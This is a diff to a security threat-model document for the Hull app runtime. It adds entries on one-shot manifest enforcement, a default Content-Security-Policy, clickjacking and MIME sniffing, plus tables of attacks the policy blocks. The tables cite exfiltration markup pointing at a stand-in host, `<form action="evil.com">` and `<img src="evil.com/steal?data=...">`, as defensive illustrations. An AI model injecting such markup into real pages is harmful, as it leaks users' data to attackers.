@@ -65,6 +65,14 @@ This is the primary threat model. Hull exists to make it possible to trust apps 
 - **Prevention:** Manifest is signed in `package.sig`. At runtime, pledge/unveil enforce the declared capabilities at the kernel level. Accessing undeclared paths triggers SIGKILL (Linux/Cosmo).
 - **Remaining risk:** macOS has no kernel sandbox — pledge/unveil are no-ops. C-level validation in capability functions is the only defense. A bug in `hl_cap_fs_validate()` on macOS would allow bypass. Linux and Cosmopolitan are kernel-enforced.
 
+**Attack: Call `app.manifest()` again at runtime to escalate capabilities**
+
+- **Prevention:** Three independent barriers make this a non-issue:
+  1. **One-shot enforcement:** `app.manifest()` errors on second call in both Lua and JS runtimes. The first call writes to a registry key; any subsequent call raises a runtime error (`"app.manifest() can only be called once"`).
+  2. **Startup-only extraction:** The manifest is read from the runtime into a C struct (`HlManifest`) once during startup (step 10 of the boot sequence). C-level capabilities (`rt->env_cfg`, `rt->http_cfg`, `rt->csp_policy`) are wired from this struct and never re-read from the runtime state.
+  3. **Kernel seal:** `unveil(NULL, NULL)` seals filesystem visibility and `pledge()` restricts syscall families. Both are one-way operations — the kernel refuses to add permissions after sealing, regardless of what the runtime state says.
+- Even without the one-shot guard, a second `app.manifest()` call would only overwrite the Lua/JS registry key with no effect on the already-wired C capabilities or the sealed kernel sandbox. The guard exists to make the immutability explicit and prevent developer confusion.
+
 **Attack: SQL injection through user input**
 
 - **Prevention:** All database access goes through `hl_cap_db_query()` / `hl_cap_db_exec()` which use SQLite parameterized binding (`sqlite3_bind_*`). SQL is always a literal string from app code. No string concatenation, ever. SQL injection is structurally impossible.
@@ -100,8 +108,20 @@ This is the primary threat model. Hull exists to make it possible to trust apps 
 
 **Attack: Cross-site scripting (XSS) via template output**
 
-- **Prevention:** Hull's template engine (`hull.template`) HTML-escapes all `{{ }}` output by default. The five dangerous characters (`& < > " '`) are replaced with HTML entities. This prevents reflected and stored XSS from user-controlled data rendered into HTML templates.
-- **Remaining risk:** Raw output (`{{{ }}}`) and the `| raw` filter bypass escaping. Developers must only use raw output with trusted content. Templates don't escape for JavaScript string contexts (e.g. inline `<script>` blocks) — use `{{ var | json }}` to safely embed data in JS contexts.
+- **Prevention:** Two layers of defense:
+  1. **Template auto-escaping:** Hull's template engine (`hull.template`) HTML-escapes all `{{ }}` output by default. The five dangerous characters (`& < > " '`) are replaced with HTML entities. This prevents reflected and stored XSS from user-controlled data rendered into HTML templates.
+  2. **Content-Security-Policy (CSP):** Hull injects a strict CSP header on every `res:html()` / `res.html()` response by default: `default-src 'none'; style-src 'unsafe-inline'; img-src 'self'; form-action 'self'; frame-ancestors 'none'`. This blocks inline scripts, external script loads, `eval()`, object embeds, and iframe embedding — even if an attacker bypasses template escaping, the browser refuses to execute injected scripts.
+- **Remaining risk:** Raw output (`{{{ }}}`) and the `| raw` filter bypass escaping. Developers must only use raw output with trusted content. Templates don't escape for JavaScript string contexts (e.g. inline `<script>` blocks) — use `{{ var | json }}` to safely embed data in JS contexts. Apps that require client-side JavaScript must customize the CSP (e.g. `app.manifest({ csp = "default-src 'self'; script-src 'self'" })`).
+
+**Attack: Clickjacking — embedding the app in a malicious iframe**
+
+- **Prevention:** The default CSP includes `frame-ancestors 'none'`, which instructs the browser to refuse rendering the page inside any `<iframe>`, `<frame>`, or `<object>` tag. This prevents UI redress attacks where a malicious site overlays invisible frames over the app to trick users into clicking hidden elements.
+- **Actor:** Any third-party website operator. Does not require compromising the app — just embedding it.
+
+**Attack: MIME type confusion / content sniffing**
+
+- **Prevention:** The default CSP's `default-src 'none'` prevents the browser from loading any sub-resources (scripts, stylesheets, fonts, media) that an attacker might inject via reflected content. Combined with `Content-Type: text/html; charset=utf-8` set by `res:html()`, the browser cannot misinterpret response content.
+- **Actor:** Network MITM or injection via stored user content.
 
 **Attack: Template injection (server-side template injection / SSTI)**
 
@@ -125,6 +145,49 @@ This is the primary threat model. Hull exists to make it possible to trust apps 
 **Attack: Session fixation / brute-force session IDs**
 
 - **Prevention:** `hull.middleware.session` generates 32 random bytes (256-bit entropy) via `crypto.random()` for session IDs. IDs are hex-encoded (64 chars). Sessions are server-side (SQLite) with sliding expiry. Expired sessions are automatically pruned.
+
+### Browser-Level Security Headers
+
+Hull injects security headers automatically at the C level to provide defense in depth:
+
+**Content-Security-Policy (CSP):**
+
+Default policy (applied to all `res:html()` / `res.html()` responses):
+```
+default-src 'none'; style-src 'unsafe-inline'; img-src 'self'; form-action 'self'; frame-ancestors 'none'
+```
+
+| Directive | Value | Blocks |
+|-----------|-------|--------|
+| `default-src` | `'none'` | All resource types not explicitly allowed (scripts, fonts, media, objects, workers, WebSockets) |
+| `style-src` | `'unsafe-inline'` | External stylesheets (inline styles allowed for SSR convenience) |
+| `img-src` | `'self'` | Images from external origins |
+| `form-action` | `'self'` | Form submissions to external origins (data exfiltration via `<form action="evil.com">`) |
+| `frame-ancestors` | `'none'` | Embedding in iframes on any origin (clickjacking) |
+
+**What the default CSP mitigates:**
+
+| Attack | Actor | How CSP Blocks It |
+|--------|-------|-------------------|
+| Reflected XSS (injected `<script>`) | Any user who can craft a malicious URL | `default-src 'none'` blocks inline script execution |
+| Stored XSS (persisted `<script>`) | Authenticated user who stores malicious content | `default-src 'none'` blocks inline script execution |
+| External script injection (`<script src="evil.js">`) | Attacker who bypasses template escaping | `default-src 'none'` blocks all external script loads |
+| `eval()`-based XSS | Attacker who injects data into JS eval context | `default-src 'none'` implicitly disables `eval()` and `Function()` |
+| Clickjacking (iframe embedding) | Any third-party site operator | `frame-ancestors 'none'` refuses rendering in iframes |
+| Form action hijacking | Attacker who injects `<form action="evil.com">` | `form-action 'self'` restricts form targets to same origin |
+| Data exfiltration via `<img src="evil.com/steal?data=...">` | Attacker with XSS who tries to leak data via image tags | `img-src 'self'` blocks images from external origins |
+| Keylogging via injected external JS | Attacker who loads a remote keylogger script | `default-src 'none'` blocks all external resource loads |
+
+**CSP configuration:**
+
+| Manifest | Behavior |
+|----------|----------|
+| No `app.manifest()` | Default strict CSP (defense in depth) |
+| `app.manifest({})` | Default strict CSP |
+| `app.manifest({ csp = "custom..." })` | Custom CSP string |
+| `app.manifest({ csp = false })` | CSP disabled (opt-out) |
+
+**Where CSP is injected:** At the C level in `lua_res_html()` and `js_res_html()`, not in application code. This means the CSP cannot be forgotten, bypassed, or misconfigured by app developers — it's structural, like parameterized SQL. Only `res:json()` and `res:text()` skip CSP (non-HTML content types are not vulnerable to script injection).
 
 ### B. Malicious Third Party (MITM / CDN Compromise)
 
@@ -253,10 +316,13 @@ app.manifest({
 | C | Every capability function validates against manifest | Returns error on violation |
 | Signature | Manifest is signed — tampering invalidates signature | Ed25519 forgery required |
 
-**No manifest declared?** If the app doesn't call `app.manifest()`:
-- No kernel sandbox is applied
-- C-level capabilities still function (with defaults)
+**No manifest declared?** Even if the app doesn't call `app.manifest()`, the default-deny posture is identical to `app.manifest({})`:
+- **Kernel sandbox is applied** — pledge/unveil restrict to only the database file and TLS paths
+- **CSP is active** — the default strict policy is injected on all HTML responses
+- **C-level capabilities deny all** — env returns NULL, HTTP requests fail, filesystem operations fail
 - Signature still covers the absence of manifest (`"manifest": null`)
+
+All example apps declare `app.manifest()` explicitly, even when the empty `{}` is sufficient, as a best practice.
 
 ---
 
@@ -374,7 +440,7 @@ These are real, not theoretical:
 | Lua lacks instruction-count metering | Infinite loops are only caught by memory limit | QuickJS has precise gas metering |
 | Canary is not foolproof | Attacker could embed magic bytes in custom binary | Reproducible builds (Phase 9) eliminate this |
 | `realpath()` is TOCTOU | Race between check and use | Kernel unveil prevents actual access |
-| No manifest = no kernel sandbox | Unsigned apps have reduced protection | Signature verification catches missing manifest |
+| Default CSP blocks client-side JS | Apps needing fetch/AJAX must customize CSP | `app.manifest({ csp = "default-src 'self'; connect-src 'self'" })` |
 | 32-entry limit per manifest category | Large apps may hit ceiling | Sufficient for most production apps |
 | `req.ctx` uses raw malloc (not tracked) | ctx JSON bypasses runtime memory limits | Capped at 64KB; bounded by runtime heap indirectly |
 | HMAC-SHA256 binding returns hex string | Callers must use constant-time comparison | `hull.jwt` and `hull.middleware.csrf` stdlib use constant-time internally |
